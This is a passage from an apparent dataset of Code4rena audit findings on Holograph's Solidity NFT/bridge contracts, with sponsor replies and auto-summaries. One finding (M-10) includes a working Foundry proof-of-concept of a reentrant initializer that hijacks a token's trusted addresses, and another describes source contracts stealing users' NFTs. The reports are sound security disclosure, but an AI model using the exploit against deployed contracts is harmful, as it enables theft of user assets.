      "summary": "\nThis bug report is about an issue with the Holograph Operator contract code, where the wrong slashing calculation is being used. This could lead to unfair punishment for operators who accidentally forget to execute their job. The bug occurs when the whole getBaseBondAmount() fee is slashed from the job.operator instead of the documented percentage of slashing. The documentation states that only a portion should be slashed and the number of slashes should be noted down. The bug was found using manual review. The recommended mitigation steps are to implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/307",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Jeiwan",
        "ctf_sec",
        "peanuts",
        "imare"
      ]
    },
    {
      "id": "5609",
      "title": "[M-16] `ApprovalAll` event is missing parameters",
      "impact": "MEDIUM",
      "content": "\n[HolographERC721.sol#L392](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392)<br>\n\n`beforeApprovalAll()` / `afterApprovalAll()` can only pass \"to\" and \"approved\", missing \"owner\", if contract listening to this event,but does not know who approve it, so can not react to this event.<br>\nBasically, this event cannot be used.\n\n### Proof of Concept\n\n      function setApprovalForAll(address to, bool approved) external {\n    ....\n\n        if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {\n          require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner\n        }  \n\n        _operatorApprovals[msg.sender][to] = approved;\n\n        if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {\n          require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner\n        }\n      }\n\n### Recommended Mitigation Steps\n\nAdd parameter: owner\n\n    interface HolographedERC721 {\n    ...\n\n    - function beforeApprovalAll(address _to, bool _approved) external returns (bool success);\n    + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);\n\n    - function afterApprovalAll(address _to, bool _approved) external returns (bool success);\n    + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success);\n\n<!---->\n\n      function setApprovalForAll(address to, bool approved) external {\n\n        if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {\n    -     require(SourceERC721().beforeApprovalAll(to, approved)); \n    +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved)); \n        }  \n\n        _operatorApprovals[msg.sender][to] = approved;\n\n        if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {\n    -      require(SourceERC721().afterApprovalAll(to, approved));\n    +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));\n        }\n      }\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/270#issuecomment-1306696158):**\n > Good catch. This will be updated so that `beforeApprovalAll` and `afterApprovalAll` passes in owner.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/270#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code found at https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392. The bug affects the beforeApprovalAll() and afterApprovalAll() functions, which only pass the parameters \"to\" and \"approved\" but not \"owner\". This means that contracts which are listening to these events are unable to react to them.\n\nThe recommended mitigation steps to solve this issue are to add an additional parameter, \"owner\", to the HolographedERC721 interface, and to modify the setApprovalForAll() function to also pass the \"owner\" parameter. This should allow the contracts to react to the events as expected.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/270",
      "tags": [
        "Event"
      ],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "5608",
      "title": "[M-15] `HolographERC721.safeTransferFrom` not compliant with EIP-721",
      "impact": "MEDIUM",
      "content": "\n[HolographERC721.sol#L366](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366)<br>\n\nAccording to EIP-721, we have the following for `safeTransferFrom`:\n\n```solidity\n///  (...) When transfer is complete, this function\n///  checks if `_to` is a smart contract (code size > 0). If so, it calls\n///  `onERC721Received` on `_to` and throws if the return value is not\n///  `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`.\n```\n\nAccording to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {`<br>\nHowever, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {`<br>\nThis leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.\n\n### Proof Of Concept\n\nLet's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol><br>\nLike the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.\n\n### Recommended Mitigation Steps\n\nRemove the ERC-165 check in the `require` statement (like OpenZeppelin does: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436>).\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#issuecomment-1307809122):**\n > This will be updated to be fully ERC721 compliant\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `safeTransferFrom` function in the HolographERC721.sol code. According to the EIP-721 specification, the function must always call `onERC721Received` when transferring tokens, not only when it has determined via ERC-165 that the contract provides this function. However, many receivers will just implement the `onERC721Received` function, and not `supportsInterface` for ERC-165 support, leading to failed transfers when they should not fail. The recommended mitigation step is to remove the ERC-165 check in the `require` statement.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/203",
      "tags": [
        "ERC721",
        "EIP-165"
      ],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "5607",
      "title": "[M-14] PA1D#bidSharesForToken returns incorrect `bidShares.creator.value`",
      "impact": "MEDIUM",
      "content": "\n[PA1D.sol#L665-L675](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675)<br>\n\n`bidShares` returned are incorrect leading to incorrect royalties.\n\n### Proof of Concept\n\n[Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)\n\n    function isValidBidShares(BidShares memory bidShares)\n        public\n        pure\n        override\n        returns (bool)\n    {\n        return\n            bidShares.creator.value.add(bidShares.owner.value).add(\n                bidShares.prevOwner.value\n            ) == uint256(100).mul(Decimal.BASE);\n    }\n\nAbove you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.\n\n### Recommended Mitigation Steps\n\nTo return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 &ast;&ast; 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 &ast;&ast; (18 - 2) or 10 &ast;&ast; 16:\n\n    function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {\n        // this information is outside of the scope of our\n        bidShares.prevOwner.value = 0;\n        bidShares.owner.value = 0;\n        if (_getReceiver(tokenId) == address(0)) {\n    -       bidShares.creator.value = _getDefaultBp();\n    +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);\n        } else {\n    -       bidShares.creator.value = _getBp(tokenId);\n    +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);\n        }\n        return bidShares;\n    }\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/180#issuecomment-1307823222):**\n > Good catch! We'll implement the suggested solution.\n\n**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/180#ref-pullrequest-1469977783):**\n > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about incorrect royalties being returned due to incorrect bidShares in the PA1D contract. The proof of concept is the Zora Market, which has lines of code that validate bidShares. The issue is that the PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected. This is because the basis points should be converted to percentages written out to 18 decimals. The recommended mitigation step is to multiple the basis point by 10 ** (18 - 2) or 10 ** 16. This should fix the issue and return the proper value.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/180",
      "tags": [
        "Wrong Math",
        "Decimals"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5606",
      "title": "[M-13] Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in `HolographOperator.sol`",
      "impact": "MEDIUM",
      "content": "\n[HolographOperator.sol#L899](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899)<br>\n[HolographOperator.sol#L920](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920)<br>\n[HolographOperator.sol#L924](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924)<br>\n[HolographOperator.sol#L928](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928)<br>\n[HolographOperator.sol#L932](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932)<br>\n\nWhen user call unbondUtilityToken to unstake the token, the function reads the available bonded amount, and transfers back to the operator.\n\n<https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899>\n\n```solidity\n/**\n * @dev get current bonded amount by operator\n */\nuint256 amount = _bondedAmounts[operator];\n/**\n * @dev unset operator bond amount before making a transfer\n */\n_bondedAmounts[operator] = 0;\n/**\n * @dev remove all operator references\n */\n_popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]);\n/**\n * @dev transfer tokens to recipient\n */\nrequire(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\");\n```\n\nthe logic is clean, but does not conform to the buisness requirement in the documentation, the doc said\n\n<https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection>\n\n> To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.\n\nThe charge 0.1% fee is not implemented in the code.\n\nthere are two incentive for bounded operator to stay,\n\nthe first is the reward incentive, the second is to avoid penalty with unbonding.\n\nWithout chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want\n\n### Proof of Concept\n\n<https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection>\n\n### Recommended Mitigation Steps\n\nWe recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.\n\n```solidity\n/**\n * @dev get current bonded amount by operator\n */\nuint256 amount = _bondedAmounts[operator];\nuint256 fee = chargedFee(amount); // here\namount -= fee;  \n/**\n * @dev unset operator bond amount before making a transfer\n */\n_bondedAmounts[operator] = 0;\n/**\n * @dev remove all operator references\n */\n_popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]);\n/**\n * @dev transfer tokens to recipient\n */\nrequire(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\");\n```\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1307863427):**\n > This is true. The functionality is purposefully disabled for easier bonding/unbonding testing by team at the moment, but will be addressed in the upcoming release.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1351786887):**\n > On initial mainnet beta launch, Holograph will be operating as the sole operator on the network so this is not an immediate concern, but before the launch of the public operator network, the fee will be added via upgrade.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the HolographOperator.sol contract, which is part of the 2022-10-holograph project on Github. The bug is related to the unbondUtilityToken function, which is used to unstake tokens. The code does not charge a 0.1% fee for unstaking as specified in the documentation, which weakens the incentive for operators to stay bonded. This bug is confirmed with a manual review of the documentation. The recommended mitigation step is to charge the 0.1% fee to make the code align with the business requirement in the documentation.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/142",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "ladboy233"
      ]
    },
    {
      "id": "5605",
      "title": "[M-12] Bond tokens (HLG) can get permanently stuck in operator",
      "impact": "MEDIUM",
      "content": "\n[HolographOperator.sol#L374-L382](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)<br>\n[HolographOperator.sol#L849-L857](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857)<br>\n\nBond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.\n\n### Proof of Concept\n\nThe `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:\n\n```js\n...\nif (job.operator != address(0)) {\n    ...\n    if (job.operator != msg.sender) {\n        //perform time and gas price check\n        if (timeDifference < 6) {\n            // check msg.sender == correct fallback operator\n        }\n        // slash primary operator\n        uint256 amount = _getBaseBondAmount(pod);\n        _bondedAmounts[job.operator] -= amount;\n        _bondedAmounts[msg.sender] += amount;\n\n        //determine if primary operator retains his job\n        if (_bondedAmounts[job.operator] >= amount) {\n            ...\n        } else {\n            ...\n        }\n    }\n}\n// execute the job\n```\n\nIn case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:\n\n```js\nrequire(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, \"HOLOGRAPH: operator is bonded\");\n```\n\n### Recommended Mitigation Steps\n\nAssuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.\n\nAlternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/322#issuecomment-1306682172):**\n > Known issue that already has been fixed for the next update.\n>\n> [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the HolographOperator code in the GitHub repository code-423n4/2022-10-holograph. The bug occurs when the function `HolographOperator.executeJob` is executed by someone who is not an operator, and the time difference is less than 6. In this case, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The issue is that if `msg.sender` is not already an operator at the time of executing the job, they cannot become one after to retrieve the reward they got for slashing the primary operator.\n\nTo mitigate this issue, it is recommended to either remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator, so that non-operators can get access to the slashing reward by unbonding after, or to add a method to withdraw any `_bondedAmounts` of non-operators. The bug was discovered through manual review.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/322",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "csanuragjain",
        "cccz",
        "arcoun",
        "Jeiwan",
        "Chom",
        "ctf_sec",
        "Lambda",
        "minhtrng"
      ]
    },
    {
      "id": "5604",
      "title": "[M-11] Source contract can steal NFTs from users",
      "impact": "MEDIUM",
      "content": "\nA source contract can burn and transfer NFTs of users without their permission.\n\n### Proof of Concept\n\nEvery Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)):\n\n```solidity\nfunction sourceBurn(uint256 tokenId) external onlySource {\n  address wallet = _tokenOwner[tokenId];\n  _burn(wallet, tokenId);\n}\n\nfunction sourceTransfer(address to, uint256 tokenId) external onlySource {\n  address wallet = _tokenOwner[tokenId];\n  _transferFrom(wallet, to, tokenId);\n}\n```\n\nWhile this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key.\n\n### Recommended Mitigation Steps\n\nConsider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`).\n\n**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1297281122):**\n > Also [`#403`](https://github.com/code-423n4/2022-10-holograph-findings/issues/403) brought up that source contract can also steal NFTs from burn address.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1306692944):**\n > Need to add a `require(!_burnedTokens[tokenId], \"ERC721: token has been burned\");` check to sourceTransfer function\n\n**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#event-7817138955):**\n > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographERC721 contract, which is part of the 2022-10-holograph project. The vulnerability allows a source contract to burn and transfer NFTs of users without their permission. This could put users at risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. \n\nThe issue was identified through manual review. It is recommended that the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` be removed and user approval be required to transfer or burn their tokens. This can be done by having the source contract call `burn` and `safeTransferFrom` instead of `sourceBurn` and `sourceTransfer`.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/290",
      "tags": [
        "Access Control"
      ],
      "finders": [
        "Jeiwan",
        "__141345__  m9800"
      ]
    },
    {
      "id": "5603",
      "title": "[M-10] Holographable tokens can be reinitialized",
      "impact": "MEDIUM",
      "content": "\nWhen new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.\n\nHowever, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.\n\nOne way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.\n\n### Proof of Concept:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n    import \"../contracts/HolographFactory.sol\";\n    import \"../contracts/HolographRegistry.sol\";\n    import \"../contracts/Holograph.sol\";\n    import \"../contracts/enforcer/HolographERC20.sol\";\n\n    //Contract used to show reentrancy in initializer\n    contract SourceContract {\n        address public holographer;\n        MockContract public mc;\n\n        constructor() {\n             mc = new MockContract();\n        }\n\n        //function that reenters the holographer and sets this contract as the new holograph slot\n        function init(bytes memory initPayload) external returns(bytes4) {\n            assembly {\n                sstore(holographer.slot, caller())\n            }\n            bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(\"0xabc\"), address(this)), bytes(\"0x0\")); \n            holographer.call(abi.encodeWithSignature(\"init(bytes)\", initCode));\n            return InitializableInterface.init.selector;\n        }\n\n        function getRegistry() external view returns (address) {\n            return address(this);\n        }\n\n        function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {\n            return address(mc);\n        }\n\n        function isTheHolograph() external pure returns (bool) {\n            return true;\n        }\n\n    }\n\n    //simple extension contract to return easily during reinitialization\n    contract MockContract {\n        constructor() {}\n\n        function init(bytes memory initPayload) external pure returns(bytes4) {\n            return InitializableInterface.init.selector;\n        }\n    }\n\n    contract HolographTest is Test {\n        DeploymentConfig public config;\n        Verification public verifiedSignature;\n        HolographFactory public hf;\n        HolographRegistry public hr;\n        Holograph public h;\n        HolographERC20 public he20;\n\n        uint256 internal userPrivateKey;\n        address internal hrAdmin;\n        mapping(uint256 => bool) public _burnedTokens;\n        address internal user;\n        function setUp() public {\n            //Creating all of the required objects\n            hf = new HolographFactory();\n            hr = new HolographRegistry();\n            h = new Holograph();\n            he20 = new HolographERC20();\n\n            //Setting up the registry admin\n            hrAdmin = vm.addr(100);\n\n            //Creating factory, holograph, and registry init payloads\n            bytes memory hfInitPayload = abi.encode(address(h), address(hr));\n            hf.init(hfInitPayload);\n            bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));\n            h.init(hInitPayload);\n            bytes32[] memory reservedTypes = new bytes32[](1);\n            reservedTypes[0] = \"0xabc\";\n            bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);\n\n            //Setting up a contract type address for the ERC20 enforcer\n            vm.startPrank(hrAdmin, hrAdmin);\n            hr.init(hrInitPayload);\n            hr.setContractTypeAddress(reservedTypes[0], address(he20));\n            vm.stopPrank();\n\n            //Keys used to sign transaction for deployment\n            userPrivateKey = 0x1337;\n            user = vm.addr(userPrivateKey);\n        }\n\n        function testDeployShadyHolographer() public {\n            //setting up the configuration, contract type is not important\n            config.contractType = \"0xabc\";\n            config.chainType = 1;\n            config.salt = \"0x12345\";\n            config.byteCode = type(SourceContract).creationCode;\n            bytes memory initCode = \"0x123\";\n\n            //giving our token some semi-realistic metadata\n            config.initCode = abi.encode(\"HToken\", \"HT\", uint8(18), uint256(0), \"HTdomainSeparator\", \"HTdomainVersion\", false, initCode);\n\n            //creating the hash for our user to sign\n            bytes32 hash = keccak256(\n                abi.encodePacked(\n                    config.contractType,\n                    config.chainType,\n                    config.salt,\n                    keccak256(config.byteCode),\n                    keccak256(config.initCode),\n                    user\n                ));\n\n            //signing the hash and creating the verified signature\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);\n            verifiedSignature.r = r;\n            verifiedSignature.v = v;\n            verifiedSignature.s = s;\n\n            //deploying our new source contract and holographable contract pair\n            hf.deployHolographableContract(config, verifiedSignature, user);\n\n            //after the reentrancy has affected the initialization, we grab the holographer address from the registry\n            address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));\n\n            //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract\n            assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);\n        }\n    }\n\n### Recommended Mitigation Steps\n\nConsider checking whether the contract is in an \"initializing\" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1295226137):**\n > I think the enforcer should be considered trusted so the risk here is low.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1306712519):**\n > Good observation. `_setInitialized();` needs to be moved higher up the stack before the init call.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographFactory contract, which is used to create new holographable tokens. During the process of creating the tokens, the holograph contract is passed in as a parameter to the initializer function. However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This allows two special addresses to transfer assets on behalf of other users without an allowance, which can lead to unauthorized transfers.\n\nTo mitigate this vulnerability, the contract should check whether it is in an \"initializing\" phase such as is done in OpenZeppelin's Initializable library. Additionally, if the bridge and operators are not intended to transfer tokens directly, the logic that allows them to bypass the allowance requirements should be removed.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/215",
      "tags": [
        "Initialization"
      ],
      "finders": [
        "securerodd"
      ]
    },
    {
      "id": "5602",
      "title": "[M-09] `HolographERC20` breaks composability by forcing usage of draft proposal EIP-4524",
      "impact": "MEDIUM",
      "content": "\n[HolographERC20.sol#L539](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539)<br>\n\nHolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \\_checkOnERC20Received:\n\n    if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {\n      require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data));\n    }\n    _transfer(account, recipient, amount);\n    require(_checkOnERC20Received(account, recipient, amount, data), \"ERC20: non ERC20Receiver\");\n    if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {\n      require(SourceERC20().afterSafeTransfer(account, recipient, amount, data));\n    }\n\nThe checkOnERC20Received function:\n\n    if (_isContract(recipient)) {\n      try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {\n        require(erc165support, \"ERC20: no ERC165 support\");\n        // we have erc165 support\n        if (ERC165(recipient).supportsInterface(0x534f5876)) {\n          // we have eip-4524 support\n          try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv\n            return retval == ERC20Receiver.onERC20Received.selector;\n          } catch (bytes memory reason) {\n            if (reason.length == 0) {\n              revert(\"ERC20: non ERC20Receiver\");\n            } else {\n              assembly {\n                revert(add(32, reason), mload(reason))\n              }\n            }\n          }\n        } else {\n          revert(\"ERC20: eip-4524 not 